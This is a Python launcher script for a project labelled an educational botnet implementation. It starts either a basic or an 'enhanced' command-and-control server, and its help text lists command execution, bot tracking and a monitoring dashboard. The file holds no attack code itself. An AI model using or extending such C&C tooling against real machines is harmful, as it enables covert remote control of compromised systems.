#!/usr/bin/env python3
"""
Quick Start Launcher for Enhanced Botnet Implementation

This script provides an easy way to launch either the basic controller
or the enhanced server with sensible defaults.

Usage:
    python launch.py                    # Interactive mode
    python launch.py --basic            # Launch basic controller
    python launch.py --enhanced         # Launch enhanced server
    python launch.py --help             # Show help
"""

import argparse
import subprocess
import sys
from pathlib import Path


def check_dependencies():
    """Check if required dependencies are installed."""
    try:
        __import__("cryptography")
        return True
    except ImportError:
        return False


def check_optional_dependencies():
    """Check if optional dependencies are installed."""
    try:
        __import__("aiohttp")
        return True
    except ImportError:
        return False


def install_dependencies():
    """Install required dependencies."""
    print("Installing required dependencies...")
    try:
        subprocess.check_call(
            [sys.executable, "-m", "pip", "install", "-r", "requirements.txt"]
        )
        print("✓ Dependencies installed successfully!")
        return True
    except subprocess.CalledProcessError:
        print("✗ Failed to install dependencies")
        return False


def parse_arguments():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        description="Quick Start Launcher - Enhanced Botnet Implementation",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s                          # Interactive mode
  %(prog)s --basic                  # Launch basic controller
  %(prog)s --enhanced               # Launch enhanced server with dashboard
  %(prog)s --basic --port 8888      # Custom port
  %(prog)s --check-deps             # Check dependencies only
  %(prog)s --install-deps           # Install missing dependencies

Features:
  Basic Controller:
    - Simple botnet C&C server
    - AES-256 encryption
    - Command execution
    - Bot tracking

  Enhanced Server:
    - All basic features plus:
    - Web dashboard (requires aiohttp)
    - Real-time monitoring
    - Performance metrics
    - Command history
        """,
    )

    parser.add_argument(
        "--version",
        action="version",
        version="Enhanced Botnet Implementation Launcher v2.0",
    )

    mode_group = parser.add_mutually_exclusive_group()
    mode_group.add_argument(
        "--basic",
        action="store_true",
        help="Launch basic controller (botnet_controller.py)",
    )

    mode_group.add_argument(
        "--enhanced",
        action="store_true",
        help="Launch enhanced server with dashboard (botnet_server_enhanced.py)",
    )

    parser.add_argument(
        "--host",
        type=str,
        default="127.0.0.1",
        help="Server bind address (default: 127.0.0.1 for security)",
    )

    parser.add_argument("--port", type=int, help="Server port number (default: 9999)")

    parser.add_argument(
        "--web-port",
        type=int,
        help="Web dashboard port (default: 8080, enhanced mode only)",
    )

    parser.add_argument(
        "--no-auth", action="store_true", help="Skip admin authentication"
    )

    parser.add_argument(
        "--verbose", "-v", action="store_true", help="Enable verbose logging"
    )

    parser.add_argument(
        "--check-deps", action="store_true", help="Check if dependencies are installed"
    )

    parser.add_argument(
        "--install-deps", action="store_true", help="Install missing dependencies"
    )

    return parser.parse_args()


def interactive_mode():
    """Interactive mode to choose which server to launch."""
    print("\n" + "=" * 60)
    print("Enhanced Botnet Implementation - Quick Start")
    print("Educational/Research Use Only")
    print("=" * 60)

    # Check dependencies
    has_required = check_dependencies()
    has_optional = check_optional_dependencies()

    print("\nDependency Check:")
    print(
        f"  Required (cryptography): {'✓ Installed' if has_required else '✗ Missing'}"
    )
    print(
        f"  Optional (aiohttp):      {'✓ Installed' if has_optional else '✗ Missing'}"
    )

    if not has_required:
        print("\n⚠ Required dependencies missing!")
        response = input("\nInstall dependencies now? (y/n): ").strip().lower()
        if response == "y":
            if install_dependencies():
                has_required = True
                has_optional = check_optional_dependencies()
            else:
                print("\nCannot proceed without required dependencies.")
                return None
        else:
            print("\nInstall dependencies with: pip install -r requirements.txt")
            return None

    print("\n" + "-" * 60)
    print("Choose server mode:")
    print("  1. Basic Controller (simple C&C server)")
    print("  2. Enhanced Server (with web dashboard)")

    if not has_optional:
        print("\n  Note: Enhanced server dashboard requires aiohttp")
        print("        Install with: pip install aiohttp aiohttp-cors")

    print("-" * 60)

    while True:
        choice = input("\nEnter choice (1 or 2): ").strip()
        if choice == "1":
            return "basic"
        elif choice == "2":
            return "enhanced"
        else:
            print("Invalid choice. Please enter 1 or 2.")


def launch_server(mode, args):
    """Launch the selected server."""
    script = "botnet_controller.py" if mode == "basic" else "botnet_server_enhanced.py"
    script_path = Path(__file__).parent / script

    if not script_path.exists():
        print(f"Error: {script} not found", file=sys.stderr)
        return False

    # Build command
    cmd = [sys.executable, str(script_path)]

    if args.host:
        cmd.extend(["--host", args.host])

    if args.port:
        cmd.extend(["--port", str(args.port)])

    if args.web_port and mode == "enhanced":
        cmd.extend(["--web-port", str(args.web_port)])

    if args.no_auth:
        cmd.append("--no-auth")

    if args.verbose:
        cmd.append("--verbose")

    print(f"\nLaunching {mode} server...")
    print(f"Command: {' '.join(cmd)}\n")

    try:
        subprocess.run(cmd, shell=False)
        return True
    except KeyboardInterrupt:
        print("\nServer stopped by user")
        return True
    except Exception as e:
        print(f"Error launching server: {e}", file=sys.stderr)
        return False


def main():
    """Main entry point."""
    args = parse_arguments()

    # Handle special flags
    if args.check_deps:
        has_required = check_dependencies()
        has_optional = check_optional_dependencies()
        print("\nDependency Check:")
        print(
            f"  Required (cryptography): {'✓ Installed' if has_required else '✗ Missing'}"
        )
        print(
            f"  Optional (aiohttp):      {'✓ Installed' if has_optional else '✗ Missing'}"
        )
        return 0 if has_required else 1

    if args.install_deps:
        return 0 if install_dependencies() else 1

    # Determine mode
    if args.basic:
        mode = "basic"
    elif args.enhanced:
        mode = "enhanced"
    else:
        mode = interactive_mode()
        if mode is None:
            return 1

    # Launch server
    success = launch_server(mode, args)
    return 0 if success else 1


if __name__ == "__main__":
    sys.exit(main())
